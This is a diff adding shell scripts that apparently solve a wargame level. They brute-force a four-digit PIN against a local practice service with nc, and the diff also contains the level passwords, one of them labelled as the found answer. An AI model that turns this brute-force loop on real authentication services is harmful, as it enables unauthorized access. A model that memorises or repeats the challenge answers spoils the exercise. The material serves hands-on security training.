@@ -1,0 +1,20 @@
+# --- send file ---
+#!/bin/bash
+
+echo -e  "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $1" | nc localhost 30002
+
+# --- main file ---
+#!/bin/bash
+
+for i in $(seq -f "%04g" $1 $2); do
+ echo $i
+ out=$(timeout -s 9 0.7 /tmp/kkk2/send $i)
+ echo $out
+ wrong=$(echo $out | grep "Wrong" | wc -l)
+ if [ "$wrong" == "0" ]; then
+  break
+ fi
+done
+
+# --- password ---
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
